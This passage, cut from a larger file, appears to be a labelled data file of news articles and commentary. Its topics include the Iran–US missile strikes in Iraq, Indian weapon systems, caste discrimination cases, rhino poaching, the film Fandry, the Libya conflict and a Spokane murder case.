On 8 January Tehran fired missiles at the facilities in Iraq housing US military personnel in retaliation against the killing of top Iranian general Qasem Soleimani. Initially, Washington insisted that no one was injured as a result of the attack. Last week, CENTCOM announced that 11 troops were being treated for injuries in the wake of the strikes."
0,"If India has to be battle ready, it has to address the gaps in its military capabilities with China. Here are five indigenous weapon systems that can help India in the event of an armed conflict. With the skirmishes between Indian and Chinese troops in the Galwan Valley on 15 June, what looked like a usual standoff in eastern Ladakh a month and a half back has now become the most serious military crisis between the two countries in over three decades. The last time the two countries came this close to an armed conflict was 1986-87, in Sumdorong Chu Valley in the Tawang district of Arunachal Pradesh, and General K Sundarji was the army chief. While an armed conflict does not look imminent, one can’t be ruled out if China refuses to pack up and move back from the new areas it has occupied. In this context, here are five indigenous weapon systems, which can help India address the gaps in its military capabilities vis-a-vis the People’s Liberation Army (PLA). 1) Light Combat Helicopter Light combat helicopter (LCH) is a dedicated light helicopter for combat operations built by Hindustan Aeronautics Limited (HAL). The helicopter, which has a narrow fuselage configuration, is equipped with “stealth features, Armour protection, Night attack capability and crash worthy landing gear for better survivability”. According to Air Chief Marshal Fali Homi Major, the only helicopter pilot to become Chief of Air Staff, “During the Kargil War of 1999, there was a need felt for armed attack helicopters capable of operating at high altitude. That’s where the LCH fits in.” “It has successfully been tested in altitudes over 13,000 feet and was the first attack helicopter to land at the forward landing base in Siachen,” he writes. The government had in November 2016 cleared the acquisition of 15 of these helos. However, no deal has been signed yet. The HAL, its maker, expects the deal to be signed this year. It has began production of five new airframes with plans to deliver ahead of time when a final deal is in place. While the initial clearance is for 15 helos, HAL expects the total number to go up to 165. 2) Netra AEW&C When fighters of the Indian Air Force (IAF) were flying towards Balakot to hit terror camps in Pakistan, airborne early warning and control (AEW&C) aircraft built by the Defence Research and Development Organisation (DRDO) were in air guiding them and keeping a close watch over movements in Pakistani airspace. The aircraft, often called India’s “eye in the sky” by defence enthusiasts, ""provides 240-degree coverage and surveillance ranges between 250km and 375km"". India, currently, has only two of these aircraft. While the first platform was inducted in 2017, the second was formally handed over to the IAF in September 2019. Experts have said that two Netra AEW&C platforms are not enough even for the Pakistan front, let along keeping an eye on movements along both northern and eastern frontier. While India’s AEW&C fleet is very small in comparison to China’s even Pakistan operates a larger fleet with six Saab 2000-based Erieye AEW&Cs. 3) Light Utility Helicopter India needs a replacement to Cheetahs and Chetaks helos in its fleet of utility aircraft. With India-Russia joint venture to manufacture the Kamov Ka-226T light helicopter delayed due to tricky negotiations between the two sides, the light utility helicopter (LUH) of HAL can be inducted by the Indian Army. The aircraft underwent high-altitude trials at Ladakh’s Daulat Beg Oldi in September 2019. In August this year, two prototypes of the LUH will head to the Siachen glacier to demonstrate its capabilities to the Indian Army. The army plans to induct 126 LUHs. According to Livefist, “The LUH achieved initial operational clearance (IOC) in February, with FOC planned for next year, by which time paperwork on inductions will have begun”. 4) Dhanush Howitzers Dhanush, a 155 mm towed artillery gun, is the first indigenous artillery gun of this calibre. The Indian Army has ordered 114 Dhanush Howitzers and the first few guns have already been handed over to it by the Jabalpur-based Gun Carriage Factory. In view of tensions with China, the army can speed up the induction of these guns for use along the China border. Dhanush guns can add to the firepower of the M777 ultra-light howitzers inducted by the army for use in mountainous terrain. The gun, an improved version of the design and technology supplied by Bofors in the 1980s, underwent trials in cold and high-altitude conditions in Leh and Sikkim. 5) Guided Pinaka During the Kargil War, Pinaka multi-barrel rocket launch system was used to target Pakistani positions. An improved version of Pinaka, called Pinaka MK-II or guided Pinaka, can improve India’s firepower along the China border. Using guided Pinaka, which has a new navigation, control and guidance system, the Indian Army can target Chinese positions with improved accuracy. The extended range version of the rocket used in this system has hit targets at a range of 90 km during trials at a test range off the coast of Odisha in December 2019. VIDEO: Guided Pinaka in its third test today at the Pokhran ranges. pic.twitter.com/H0SqFsry9G One Pinaka launcher has 12 rockets which can be fired in 44 seconds. Each Pinaka rocket delivers 100 kilograms of high explosive on the target. This means that around 7.2 tonnes of high explosive is delivered on the target in 44 seconds. An Appeal...

0,"Iraqi Prime Minister Adel Abdul-Mahdi told Secretary of State Mike Pompeo on Friday that the U.S. should send delegates to Iraq in order to determine the best way to withdraw all of its troops there, the AP reports. The big picture: While tensions between the U.S. and Iran seem to be lessening, Abul-Mahdi is standing his ground and backing the Iraqi parliament's non-binding resolution to expel all U.S. troops from the country. Why it matters: A U.S. exit from Iraq could ultimately be one of the most consequential results of the escalation in U.S.-Iran tensions, because it would significantly hamper the fight against ISIS and achieve a major Iranian objective. The other side: The State Department issued a statement rebuffing Abdul-Mahdi's request, saying, ""At this time, any delegation sent to Iraq would be dedicated to discussing how to best recommit to our strategic partnership — not to discuss troop withdrawal, but our right, appropriate force posture in the Middle East.""

Published: 11th October 2020 08:33 PM | Last Updated: 11th October 2020 08:33 PM | A+A A- 26-year-old doctor Payal Tadvi ended her life after alleged casteist slurs by her senior colleagues at BYL Nair Hospital in Mumbai. (Photo | PTI) As discussion on Dalit rights gain momentum in the aftermath of Hathras gangrape case, 'JusticeForDrPayal' trended on Twitter in light of Supreme Court's recent judgement on Dr. Payal Tadvi's suicide case. On October 8, the apex court permitted the three accused, in a case of suicide by Dr. Payal Tadvi in May 2019 due to alleged caste-based discrimination, to go back to the college and hospital and pursue their post-graduate studies. The three - Hema Ahuja, Bhakti Mehare and Ankita Khandelwal who were arrested in connection with the case last year, are reportedly set to return to their colleges on October 12. The apex court relaxed one of the conditions imposed on them by the Bombay High Court, which had granted them bail in August last year and said that they shall not enter into the jurisdiction of the concerned police station and more particularly the college. Calling the development a 'travesty of justice' social activist and politician, Prakash Ambedkar, questioned the 'impunity' and 'unaccountability' of those accused. Allowing the 3 accused doctors in the institutional murder of Dr. Payal Tadvi to enter the college for carrying on their life as usual is a travesty of justice. The impunity and unaccountability of people accused of caste based violence is utterly shameful. #JusticeForDrPayal Other Twitter users too took to the platform to voice their anger and angst on the subtle but apparent 'casteism' prevalent in the Indian society and expressed dismay over how Maharashtra had 'failed' Payal Tadvi. One user tweeted: No matter how much civilized we show ourselves in front of this world, elements like castism in India takes us several centuries back. #JusticeForDrPayal #MaharashtraStateFailedDrPayal"" No matter how much civilized we show ourselves in front of this world, elements like castism in India takes us several centuries back. #JusticeForDrPayal#MaharashtraStateFailedDrPayal pic.twitter.com/lMPiwOJMRi While others also exclaimed at the 'upper caste' advantage bestowed upon people accused of violence against Dalits and how the deceased doctor's mother had to make regular court rounds to ensure justice for Payal. Dr. Payal Tadvi's mother Abeda Tadvi has been fighting bravely since the last year. Her health condition is critical but she ensures she travels 500kms each time to attend the hearing in the Mumbai's court. Her message here is important! #JusticeForDrPayal https://t.co/RZP2acdn25 Tadvi was a student of post-graduate degree course in Gynaecology and Obstetrics and had completed first year of the course in April last year.

0,"Wildlife poaching is a crime that harms local communities, wildlife populations, and the environment in various ways. It is fueled by a lucrative black market trade of animal parts, and numerous environmental groups, animal rights groups, and government agencies are calling for an end to it. Rhino poaching is a severe threat in all rhino range states, as the horns of these animals are highly valuable. They are used in Traditional Chinese Medicine and are also seen as a status symbol to display success and wealth. The Sibuya Game Reserve is located in the South African province of Eastern Cape, and it is the home of numerous animals, including the five biggest game animals in Africa: lions, rhinos, elephants, buffalos, and leopards. Over the last years, there have been several intrusions by poachers. However, an incident that happened in 2018 can now serve as a warning for them to stay away. Namely, when a group of poachers entered the reserve to hunt rhinos, a pack of lions devoured them! It is believed there were three men, as investigators found three sets of shoes and gloves, but very little of their remains were left.  Nick Fox, the park’s owner, believes that this was because the predators had many hours to feast, as the poachers were eaten alive sometime between the evening of July 1 and the early morning of July 2. He said: “The only body part we found was one skull and one bit of pelvis, everything else was completely gone.” He guessed that the incident probably happened around 4:30 a.m. on July 2, as then, one of the reserve’s anti-poaching dogs gave a warning. Yet, it was ignored by the dog handler, as this was typical behavior for that time of the morning. Later on in the day, one of the rangers found the bloodied remains, and they immediately notified the police. Fox said: “At about 4.30 pm on Tuesday, one of our field guides on game drive alerted the Anti-Poaching Unit that there appeared to be human remains as well as other items in the immediate vicinity of the lions. I was immediately called to the scene where along with the APU we found the high powered rifle, gloves, wire cutters and the remains of a backpack with food, water, and other supplies. We immediately alerted the Indalo (Association of Eastern Cape Game Reserves) Anti-Poaching Cluster and the Police. Clearly, the poachers had walked into a pride of six lions and some, if not all had been killed.” Police spokeswoman Captain Mali Govender said: “We do not know identities but firearms have been taken by the police and will be sent to the ballistics laboratory to see if they have been used in poaching before.” They called in a search party and enlisted the help of a helicopter to scout for any survivors, but they found none. Fox added: “We found enough body parts and three pairs of empty shoes which suggest to us that the lions ate at least three of them but it is thick bush and there could be more. They came heavily armed with hunting rifles and axes which we have recovered and enough food to last them for several days so we suspect they were after all of our rhinos here.”  He hopes that this incident will send a message to poachers not to risk their lives by illegally hunting game: “Whilst we have saddened at any loss of life the poachers came here to kill our animals and this sends out a very clear message to any other poachers that you will not always be the winner. The lions are our watchers and guardians and they picked the wrong pride and became a meal.” He said that numerous people called him to ask about the fate of the lions, and he explained: “They won’t be killed. The status quo will continue.”  The number of rhinos is drastically reduced all around the world, mostly due to habitat loss and poaching. In the past decade, over 7,000 of them have been killed in South Africa only. Believe it or not, a single horn can be sold for up to $300,000, but on the South African black market, white rhino horns sell for up to just $3,000. In 2016, poachers entered The Sibuya Game Reserve, shot three rhinos dead, and cut off their horns. This time, poachers ended up as preys.

0,"Fandry is a rigorous cinematic exercise for viewers to contemplate on: what kind of society we have become; what kind of cinema this society has produced; and what kind of society cinema has constructed, in which a man is denied love just because he is Dalit. Historically, Indian cinema exploited the labour of Dalits in its making, whilst erasing or appropriating their stories. This was not an accidental practice. When their stories were told on screen, it would be by savarnas who also played their characters with patriarchal, sexist and casteist undertones. The scenario has slowly changed, and the identity of Dalit characters in cinema — directed by a Dalit (and a few non-Dalit) filmmakers — has become explicit, transcending boundaries of caste and class. These filmmakers have helped shape visual storytelling that combines “justice with aesthetics”. “Justice with aesthetics” was rarely present in cinema made by savarnas, or it was seldom honest. Dalit-Bahujan filmmakers have filled this gap, while creating a new wave of cinema that is more appealing to a Dalit-Bahujan audience. In this series, we examine 10 Indian films that count not only among the finest cinema the country has produced, but are also intertwined with justice, politics, and aesthetic. *** When I was five or six, my father — then a driver and a movie buff — would take me to watch Bollywood films every Sunday at single screen theatres across Nagpur. For me, entering those darkened cinema halls was like entering a new world, one that seemed alien from my real world — a Dalit basti and the harsh life there. That sense of alienation stayed with me for a long time. I came to Mumbai in 2013 to pursue an MA. The very next year was when Nagraj Manjule’s Fandry was released. I wasn't a fan of Marathi cinema, but having heard about the film from a few people, decided to watch it in the theatre. It was the most beautiful and nuanced cinematic imagination I had ever witnessed unfolding in a film hall. Did everyone feel the same after watching Fandry? Of course not. Why? Because, viewers in India watch cinema with the baggage of our caste, and our experience of a film depends on how our caste-conditioning makes us see the world. For me, after watching Fandry, the alienation I had felt for so long in relation to cinema came to an end. Fandry brought many ‘I’s on screen, giving them the confidence, personality and purpose that had been ripped from us by Bollywood movies. * In 1913, Dadasaheb Phalke, a Marathi Brahmin also known as “the father of Indian cinema”, made the first Indian feature film: Raja Harishchandra. It was a silent motion picture. Almost all of Phalke’s movies are based on a Hindu-Brahminical mythological imagination of India and its society. The initiation of the Hindu-Brahmin myth into cinema technology was not accidental: Phalke — being a Brahmin whose social position meant having very little contact with a vast swathe of society and its stories — grew up alienated from the pains and virtues of the masses. This alienation reflected in nearly all Marathi directors and their movies. Only a handful of movies were truly “sensible”, in aesthetic and politics. However, all were products of the Brahminical imagination; caste as a cultural location in their cinema was subverted, manipulated and often appropriated as per convenience. Nothing changed on these lines for a hundred years in Marathi cinema. Then Fandry was released in 2014. Its frames, camera angles, screenplay, background music, storytelling, noises, even silence — all broke rules Marathi cinema had followed thus far. As I got up from my seat in the theatre after the final scene — as the stone pelted by the protagonist Jabya fills the entire screen — I felt numb, speechless. It took me a while to realise just how enriching the experience of watching a work of art can be. Fandry is undisputedly among the masterpieces in the world cinema: Not because it has a Dalit protagonist or director, but for the way it translates social reality into cinematic imagination. Great cinema helps the masses to integrate in it, it appeals to their pain, virtues and aesthetics; it isn’t servile to the tastes of a few bourgeoisie. It is these qualities that make Fandry a cinematic masterpiece. Still from Nagraj Manjule's Fandry (2014) Interestingly, the early movies of Raj Kapoor had some Leftist or liberal undercurrents — largely because those screenplays were written by Left-leaning screenwriters and their immortal songs were written by Shailendra, a Dalit, whose profound lyrics are unparalleled. In Fandry, the camera is neither sympathetic nor pitiful towards its protagonist, nor is it artificially rebellious. It is anxious; it is beautiful; it is in search of a dream; it aspires to be normal amid abnormal caste-realities. It is not larger than life, but it is life — one paralysed by the society and cunningly defamed in cinema in India. This life, the life of Dalits, is revived and provided a meaning in the cinematic imagination for the first time in India. Fandry re-introduces a hero who is “dead” in history and erased by cinema from the lives of people. So far, Indian cinema had chosen to remain in ignorance when it comes to Dalit lives. Out of pity, in a few movies (from the parallel cinema movement) some facts or behaviour about Dalit lives were portrayed by savarna directors — that too negatively. Frantz Fanon writes in his book Black Skin, White Mask: “What is essential to us is not to accumulate facts and behaviour, but to bring out their meaning.” Fandry brought out the meanings of Dalit life. It is beyond any political state ideology. Fandry’s protagonist Jabya, or Jambuwant Kachru Mane, is a dreamer, a man of letters, a lover and more importantly, sensitive to the world around him. This does not mean he is submissive. He is smart, hardworking and aspires to follow his dreams, his love. But his caste-reality fractures the wheel of his aspirations. He has to respond to it. When Jabya is subjected to humiliation, he remains calm and tolerant. But he is, in the climax, humiliated in front of his love, school mates. Moreover, his sisters are too humiliated and despised for their “smell”. This is what he cannot tolerate and responds with aggression — with a stone cast towards his upper caste harassers in the film. Jabya is an uncommon protagonist because no Indian filmmaker had previously put the centrality of a movie in a Dalit man. In Fandry, a Dalit man arrives at a vision of life, and through his eyes, the audience sees the world, now and thereafter. Herein lies the brilliance of Nagraj Manjule. Fandry revived Marathi cinema. Apart from its stellar cinematic language, Fandry speaks to us as an enigmatic poem whose purpose is to teach us about the value of life, make us feel the agonies that our ignorance about each other begets, and destroy the false consciousness that the cultural industry has created throughout so many years and decades. Fandry is also a rigorous cinematic exercise for us as viewers to contemplate on: what kind of society we have become; what kind of cinema this society has produced; and what kind of society cinema has constructed, in which a man is denied love just because he is Dalit. When I look back on the day I watched Fandry for the first time, I feel that something in me changed forever in relation to cinema. I knew then that no matter how small it may be, but I too have a space in the cinematic imagination of this country. I know that whenever people like me watch Fandry, they too feel that they are telling their story to a world which ignored them so far. * Yogesh Maitreya is a poet, translator and founder of Panther's Paw Publication, an anti-caste publishing house.

0,"Iraqi prime minister Adel Abdul Mahdi.Thomas Stolte/Intertopics via ZUMA The Washington Post reports that Iraq is serious about wanting American troops to leave: It had become clear that the U.S. military presence in Iraq is growing increasingly untenable, at least in its current form, in the wake of the killing of Iranian Maj. Gen. Qasem Soleimani last week, which drew threats of retaliation from Iran and its regional allies against U.S. troops in Iraq and beyond….In comments to the Iraqi cabinet, broadcast on state television, Abdul Mahdi expressed exasperation with the conflicting signals coming from Washington. The letter he received “was clear,” he said, in its reference to a U.S. withdrawal from Iraq. “It’s not like a draft or a paper that fell out of the photocopier and coincidentally came to us,” he told the cabinet. Two Iraqi officials said the caretaker prime minister had read the letter as a signal of a U.S. intent to withdraw and concluded that it was necessary in light of the spiraling tensions between the United States and Iran, which risk putting Iraq in the middle of a new war….Abdul Mahdi has asked the United States to put in place a timeline for a withdrawal, the official said. The letter that we’ve all seen wasn’t signed by anyone, but apparently the copy Abdul Mahdi received did bear a signature. So it was a wee bit more than a “mistake.” I wonder how serious Abdul Mahdi is about following through with a complete American withdrawal? This is not quite the way I envisioned us leaving Iraq, but I’ll take it. We shouldn’t be there, and if Donald Trump’s blundering is what it takes to get us out, then I’ll count it as an ugly win, but a win nonetheless.

0," Aurangabad: A 50-year-old Dalit woman was set ablaze by a man when she tried to resist his move to enter her house in Maharashtra's Aurangabad district, officials said on Wednesday.  The woman, who suffered about 95 per cent burns in the incident that took place in Andhari village of Sillod tehsil on Sunday midnight, was battling for life at a government hospital here.   Her condition was ""critical"", authorities at the hospital said.  The accused, Santosh Mohite (50), also a resident of the same village, was arrested late Tuesday night, an official at Sillod (rural) police station said.  The woman, who is married and has two daughters, lived alone in her house and Mohite tried to enter the place around 11 pm on Sunday, the official said, adding that the motive behind his act was yet to be ascertained.  When she tried to prevent his move, Mohite forcibly entered the house, poured kerosene kept in the premises over her and set her on fire, he said.  He then locked the door from outside and ran away, the official said.  On hearing cries of the woman, some of her relatives staying in the vicinity rushed to the place and took her to a local hospital, from where she was referred to the government- run Ghati Hospital in Aurangabad city.  ""Her condition is critical. She has suffered 95 per cent burns. She is presently on oxygen support,"" the hospital's medical superintendent Suresh Harbade told PTI.  Meanwhile, the accused has been booked under Indian Penal Code Sections 307 (attempt to murder), 323 (voluntarily causing hurt), 452 (house-trespass with preparation for causing hurt to any person) and 504 (intentional insult with intent to provoke breach of peace).  He has also been charged under provisions of the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act, the police said.  In a similar incident, a 25-year-old woman college teacher was set on fire by a stalker in the state's Wardha district on Monday.  Her condition was stable but critical, a doctor said on Tuesday. —PTI  © 2021 The Hawk"
0,"Summit in DRC comes almost two weeks after world powers met in Berlin to end foreign meddling in North African state. African Union leaders are expected to renew calls for greater involvement in efforts to resolve Libya’s long-running conflict at a summit held on Thursday in the Republic of the Congo. The meeting in Brazzaville will be held almost two weeks after international stakeholders – including many who back opposite sides in the months-long battle over Libya’s capital, Tripoli – gathered in Berlin and agreed to push the warring sides for a permanent ceasefire and respect an existing United Nations arms embargo. The oil-rich North African country has been beset by war and insecurity since the 2011 overthrow and killing of longtime leader Muammar Gaddafi during a NATO-backed uprising, with rival factions and militias fighting over control of the county. Libya has since been split into rival western and eastern administrations: the UN-recognised Government of National Accord (GNA) holds Tripoli in northwestern Libya, while a rival administration in the east is aligned with renegade military commander Khalifa Haftar, whose forces in April 2019 launched a military offensive to seize the capital. “The whole African continent is worried about the consequences of what is happening in Libya,” Senegalese President Macky Sall said on Tuesday during a news conference with Turkish President Recep Tayyip Erdogan in Dakar. Sall called for the bloc’s involvement “in any search for a solution”, which he said could only be political. The push for greater AU say is led by the countries bordering Libya, especially in the Sahel region, which fear the crisis will have a greater knock-on effect on an escalating conflict with armed groups operating across the region including in Chad, Niger, Mali, Burkina Faso and Mauritania. The worsening violence in the region involves fighters linked to al-Qaeda and ISIL (ISIS) and last year killed more than 4,000 people. At the root of the Sahelian countries’ concerns is the number of arms flowing into the region from Libya. “There’s no doubt that the 2011 war in Libya had ripple effects across the Sahel in the form of weapons being transferred from Libya into neighbouring countries to the south,” Claudia Gazzini, senior Libya analyst for the International Crisis Group, told Al Jazeera. “What that is creating is a different perspective between Sahel countries and European countries on what the solution in Libya should be,” she added. Divisions among European countries, particularly France and Italy, have hampered efforts to find a solution to the conflict, with Rome backing the UN-brokered GNA and Paris widely seen as supportive of Haftar. “[In Africa,] Chad sees Haftar as the necessary strongman for Libya. It has encouraged other African countries to take a pro-Haftar line … at the expense of support for the GNA who Sahel countries do not see as a strong and long-term counterpart,” Gazzini said. Armed groups operating in the Sahel, especially Jama’at Nasr al-Islam wal Muslimin (JNIM), are also able to find safe haven within some of most Libya’s most unstable regions, where aligned armed groups hold territory. Heni Nsaibia, a senior researcher for the Armed Conflict Location and Event Data Project (ACLED), said “the links between Libya and the Sahel consist of movements by Sahelian [mostly JNIM] militants back and forth between the two locations”, especially along Libya’s border with Niger and Algeria. “The links to Ubari are strong,” he told Al Jazeera. Located in southwestern Libya, Ubari has long been used by al-Qaeda in the Islamic Maghreb (AQIM) and Ansar Dine fighters for leisure and recovery. Several senior AQIM trainers have been repeatedly targeted by US drone attacks there. Niger meanwhile shares border with Nigeria to the south, which has allowed armed groups from all three countries to form a geographical chain from North to sub-Saharan Africa – for example, Islamic State in the Greater Sahara (ISGS) was recently incorporated into Islamic State West Africa Province (ISWAP) or Boko Haram, which has its origins in Nigeria. “The Sahel is suffering from this crisis. Proliferation of arms in the region has facilitated the spread of terrorism,” Chad’s Foreign Minister Mahamat Zene Cherif said last week. The Brazzaville gathering will not be the first time the AU has sought to play a more prominent role in solving the Libyan crisis. Previous efforts however have failed, including a bid last year for a joint UN-AU envoy for Libya, and Thursday’s meeting of the AU High Level Committee on Libya looks unlikely to offer a breakthrough. “The AU has been in and out of peace negotiations in Libya for the last 10 years,” Judd Devermont, director of the Africa Program at the Centre for Strategic and International Studies, told Al Jazeera. “The African Union regards Libya as within its mandate, even though its peace initiatives there have consistently fallen flat,” he said. Libya remains a top priority for the UN Security Council and so far the body has given little attention to AU calls for more involvement. Egypt, another stakeholder in the peace talks which shares a border with Libya, sees Libya as an Arab issue and is also unlikely to give backing to any AU-brokered deal. When peace talks started nine years ago, African presidents who tried to become involved in brokering peace found difficulties establishing links with rebels based in Benghazi. AU countries meanwhile have only a small diplomatic presence in Libya and in neighbouring Tunisia, where many of the international stakeholders’ embassies are located and meetings on peace in Libya usually take place. “They keep a relatively low profile apart from demanding a greater role to solve the conflict,” Gazzini said. “This demand is not matched with political knowledge about the conflict.” Follow Al Jazeera English:"
0,"BAGHDAD Iraq -- A total of 22 missiles struck two bases housing US troops in Iraq but there were no Iraqi casualties, the military said Wednesday after the overnight attack. The statement made no mention of Iran, which claimed that it had fired ballistic missiles at the Ain al-Asad airbase in retaliation for the US killing of a top Iranian general. ""Between 1:45 am and 2:15 am (2245 GMT and 2315 GMT) Iraq was hit by 22 missiles, 17 on the Ain al-Asad air base and ... five on the city of Arbil,"" the Iraqi military said. ""There were no victims among the Iraqi forces,"" it added, but did not mention whether or not there were casualties among foreign troops. Ain al-Asad is the largest airbase where US-led coalition troops are based. Arbil is the capital of the Kurdish region, and a top official from the regional government said no American military base or US consulate was hit there. The official also said there were no casualties in Arbil. President Donald Trump on Tuesday took to Twitter following the strike to say an ""assessment of casualties & damages taking place now."" ""So far, so good!"" he wrote. It was the first time Iran directly targeted a US installation with ballistic missiles. Over the last two months, US troops and even the embassy in Baghdad had been targeted in more than a dozen rocket attacks that Washington blamed on pro-Tehran groups, but none had been claimed. --Agence France-Presse"

Rhinos across Africa are being poached at an increasingly high rate amid COVID-19 lockdowns and restrictions. With national parks and wildlife reserves currently free of tourists and patrols, poachers are taking advantage of stay-at-home orders. They are killing and injuring rhinos and other endangered species in tourist hotspots and other places that are usually safe due to the normally large influx of tourists. Poachers hunt rhinos for their horns and bushmeat, which they illegally trade in exchange for money. Several poaching bosses have instructed their employees to hunt rhinos in parks and other typically protected spaces since COVID-19 restrictions have gone into effect, according to a report from the Wildlife Justice Commission published in April. In the last few months, six rhinos have been killed by poachers in Botswana and another nine have been poached in South Africa. Kenya has also seen a recent increase in poaching. As the pandemic halts tourism to Africa, poachers are killing rhinos in travel hot spots now devoid of visitors. In Botswana, at least 6 $rhinos have been poached since the virus shut down tourism there and in the northwest South Africa, at least nine. https://t.co/L7Zh5IvkZlpic.twitter.com/hLRO4aKeaR Due to COVID-19 restrictions and the overall lack of tourism revenue, ranger patrols have been significantly reduced. Many rangers have been forced to stay home, while others have taken substantial pay cuts. The pandemic has also caused a drastic dip in funding for the protection of wildlife reserves and endangered species. ""The COVID-19 lockdown illustrates just how important ecotourism is for the conservation of Africa’s natural heritage,"" WildAid CEO Peter Knights told HuffPost. ""If the lodges are closed, there are more unemployed people, and without tourists on safari or people working in lodges, you have less surveillance."" $(function() { var contentListProps = { contentList: JSON.parse('[{\u0022id\u0022:19516,\u0022thumbnails\u0022:{\u0022medium\u0022:{\u0022landscape\u0022:\u0022https://media.globalcitizen.org/thumbnails/d7/26/d726657f\u002D8b7c\u002D4664\u002D893e\u002Dc342a6bb8c1e/the_last_remaining_northern_white_rhinos_1.jpg__800x600_q85_crop_subsampling\u002D2.jpg\u0022,\u0022portrait\u0022:\u0022https://media.globalcitizen.org/thumbnails/d7/26/d726657f\u002D8b7c\u002D4664\u002D893e\u002Dc342a6bb8c1e/the_last_remaining_northern_white_rhinos_1.jpg__600x800_q85_crop_subsampling\u002D2.jpg\u0022,\u0022landscape_16_9\u0022:\u0022https://media.globalcitizen.org/thumbnails/d7/26/d726657f\u002D8b7c\u002D4664\u002D893e\u002Dc342a6bb8c1e/the_last_remaining_northern_white_rhinos_1.jpg__800x450_q85_crop_subsampling\u002D2.jpg\u0022},\u0022large\u0022:{\u0022landscape_16_9\u0022:\u0022https://media.globalcitizen.org/thumbnails/d7/26/d726657f\u002D8b7c\u002D4664\u002D893e\u002Dc342a6bb8c1e/the_last_remaining_northern_white_rhinos_1.jpg__1600x900_q85_crop_subsampling\u002D2.jpg\u0022},\u0022credits\u0022:{\u0022caption\u0022:\u0022Peter Esegon, 47, one of the primary rhino caretakers pets Najin while she rests in her holding area.\u0022,\u0022author\u0022:\u0022© Justin Mott\u003B courtesy Anastasia Photo\u003B New York.\u0022,\u0022description\u0022:\u0022Peter Esegon, 47, one of the primary rhino caretakers pets Najin while she rests in her holding area.\u0022}},\u0022title\u0022:\u0022What Guarding Rare Rhinos Says About Saving the Planet\u0022,\u0022url\u0022:\u0022https://www.globalcitizen.org/en/content/northern\u002Dwhite\u002Drhinos\u002Dconservation/\u0022}]'), unorderedWithImage: true, v3Styles: true, v3Classes: ""bst-container-fluid"", showDescription: false, showMobileImage: true, thumbnailLinkTabIndex: ""-1"" }; bindComponentToDiv( ""related-stories-content-list--401415"", ContentList, contentListProps ); var pageHeadlineProps = { h5: ""Related Stories"", className: ""pt-0 pb-3 my-0"" }; bindComponentToDiv( ""related-stories-plugin-headline--401415"", PageHeadlines, pageHeadlineProps ); }); Rhinos are critically endangered.

0,"UPDATED: Mon., Feb. 3, 2020 A 29-year-old Iraqi immigrant, Ibtihal Darraji, has been identified as the woman found strangled inside a burning car Friday on the South Hill. Police have arrested her ex-husband, Yasir A. Darraji, 30. He has been charged with first-degree murder. A police officer drove by the car on 27th Avenue near Fiske Street at about 9 p.m. Friday. When he passed by again, about 20 minutes later, the inside of the car was on fire, court documents show. He called the Spokane Fire Department who responded and found Ibtihal Darraji’s body. according to court documents. The Spokane County Medical Examiner said the cause of her death was strangulation. Ibtihal and Yasir Darraji divorced about four years ago and have two children together. On the night of her death, Ibtihal texted her friend that she was on her way to pick up her son from Yasir and then would stop by to drop off a few things. She never arrived. Friends interviewed during the investigation told police of multiple threats Yasir had made against his ex-wife over the last few years, court documents show. The couple’s 13-year-old daughter told police that on the night of her mother’s death, her father left for work at 6:11 p.m. and wasn’t home when she woke up the next morning, something she found unusual. Yasir told police he was upset because he smelled marijuana in Ibtihal’s car when she picked up their young son the night of her death. He then intended to go to work as a Lyft driver but was so upset that he ended up just driving around, according to court documents. The time frame that he was gone changed multiple times during police interviews, according to court documents. He said he left as early as 6:30 p.m. and came home as late as 9:30 p.m. Ibtihal’s car was discovered on fire at about 6:20 p.m. Ibtihal worked at St. Aloysius Church until September, said Don Weber, the church administrator. Last summer she went home to Baghdad to visit her mother and when she came back, she told her co-workers that she feared for her life because family members didn’t want her to return to Spokane. “Our understanding is she was part of an arranged marriage to her husband,” Weber said. Ibtihal was about 16 years old when she had her daughter. Her son was born a few years later and is in elementary school, Weber said. Weber described the boy as a “very sweet, nice kid that cared a lot about his mother.” The car was a recently purchased Toyota Prius that she bought from the Society of Jesus at Gonzaga University. An ex-girlfriend of Yasir told police he had threatened to kill her multiple times and assaulted her when she was pregnant with their child, according to court documents. One threat the ex-girlfriend remembered and told police was that Yasir said he would pour gasoline on her mother’s house and burn it down. Police were called to an incident between Ibtihal and Yasir Darraji in early January. On Jan. 9, both Ibtihal and Yasir Darraji spoke with a Spokane County Sheriff’s deputy regarding an incident in which Ibtihal and her friend confronted Yasir and his friend about the men spreading rumors that Ibtihal was pregnant out of wedlock, according to court documents. Yasir recorded the conversation and complained to police that his ex-wife’s friend had assaulted him previously for spreading the rumors, court documents show. Deputies did not take any action other than council Ibtihal’s friend on her actions, court records say. The couple spent much of their lives living in Iraq, according to court documents. In their culture, court documents said the actions of Ibtihal would reflect poorly on Yasir, even after their divorce. This idea was confirmed by Ibtihal’s friend when she was interviewed by police. She told police that Yasir was angry with Ibtihal for going out to “nightclubs.” She also told police that Yasir wanted Ibtihal to leave their children with him and move back to Iraq, and that if she didn’t, Yasir said he would kill her.

Ms Hanson raised concerns regarding the rights of the company to “export their produce to their own country” even if this means that Australia has to “import our milk” from elsewhere. According to Sky News host James Morrow, “when we’re talking about selling to China we’re talking about selling to state owned enterprises… we are selling to companies that are very closely linked to the Chinese government”. “This is a national security issue,” he said. “This is not just about farm and agriculture,” Mr Morrow said.

People can be heard speaking in a Rajasthani dialect in the video. We performed a keyword search based on this information and found a Dainik Bhaskar report from July 31, 2020. According to the report, a person was beaten up and tied to a tree on the suspicion of an illicit relationship with a woman in Konar village of Chohtan police station area, ​​Barmer district, Rajasthan. The victim hails from the Bhil caste and is a resident of Mogawan Bakhasar. As per the report, he entered a woman’s house in Ratanpura and stayed the night. When locals in the area learned in the morning, they tied the youth to a tree, beat him up, shaved off his hair and forced him to drink urine. The case did not reach the police as the village panchayat helped both parties reach an agreement. But after a video of the incident went viral on social media, Chohtan police took cognisance of the matter and registered a case against the accused. The report quotes Deputy Superintendent of Police (DSP) Ajit Singh who said that both sides hail from the Bhil caste.  Jagran also published a report on the incident on July 31. We spoke with Barmer SP Sharma who informed that the case does not depict Dalit oppression but a family issue. The youth who was thrashed belongs to the Bhil community (Scheduled Tribes) and the people who attacked him also hail from the same community. Sharma said that this incident is from Chohtan police station area, Barmer district. He was caught with a woman and subsequently beaten up. His hair was also shaved off. SP Sharma said that no complaint was lodged with the police as this was a family issue. But the cops took cognisance of the matter after a video went viral and filed a case. The names of the accused can be seen in the complaint attached below.  After Barmer police noticed that the video was circulating with false context, they clarified on Twitter that the incident was related to a family dispute. The tweet also 